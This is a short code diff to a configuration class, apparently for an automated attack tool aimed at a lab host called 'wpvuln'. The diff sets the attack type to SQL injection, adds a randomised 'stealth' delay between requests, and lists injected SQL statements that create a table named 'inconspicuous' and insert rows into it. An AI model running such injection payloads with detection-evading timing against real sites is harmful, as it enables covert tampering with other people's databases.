@@ -11,9 +11,15 @@ class Config(object):
         c = [{
                 'host': 'wpvuln', 
                 'base_url': 'http://wpvuln',
-                'attribute': 'thisisnotgood',
+                'attribute': 'inline',
+                'stealth_interval': 'random.normalvariate(5, 1.8)+3',
                 'attack': 'sqlinjection',
-                'stealth': '1',
+                'statements': [
+                    "create table inconspicuous (data text) --",
+                    "insert into inconspicuous(data) values('hello')--",
+                    "insert into inconspicuous(data) values('world')--"
+                ]
+
              }
         ]
         log.debug('sample {}'.format(c))
